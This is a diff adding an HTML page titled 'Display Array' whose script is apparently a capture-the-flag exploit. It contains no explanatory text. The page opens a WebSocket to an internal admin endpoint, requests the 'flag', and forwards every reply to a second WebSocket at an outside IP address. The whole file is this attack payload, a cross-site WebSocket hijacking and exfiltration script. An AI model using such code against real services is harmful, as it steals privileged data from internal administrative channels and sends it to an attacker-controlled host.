@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		 <title>Display Array</title>
+	</head>
+	<body>
+		<div id="messages"></div>
+		  <script>
+				console.log("coomer")
+				let socket = new WebSocket("ws://web:8080/admin/ws", 'echo-protocol');
+				socket.addEventListener("open", (event) => {
+					socket.send("flag");
+				});
+				console.log("coopi")
+				socket.addEventListener("message", (event) => {
+					let message = event.data
+					let sooket = new WebSocket("ws://141.11.246.205:8765");
+					sooket.addEventListener("open", (event) => {
+						sooket.send(message);
+					});
+				});
+			   </script>
+	</body>
+</html>
